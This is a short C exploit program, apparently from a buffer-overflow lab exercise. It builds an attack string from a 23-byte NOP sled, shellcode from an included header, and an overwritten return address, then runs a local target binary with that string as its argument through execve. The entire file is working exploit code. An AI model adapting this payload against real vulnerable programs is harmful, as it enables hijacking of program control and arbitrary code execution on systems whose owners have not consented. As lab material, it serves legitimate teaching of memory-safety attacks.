#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

#define BUF_SIZE 73

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char attack[73];

	strcpy(attack, "\x90");
	int i;
	for (i = 0; i < 22; i++)
        strcat(attack, "\x90");

	strcat(attack, shellcode);
	strcat(attack, "\x10\xfe\x21\x20\x00");

    args[0] = TARGET;
	args[1] = attack;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}

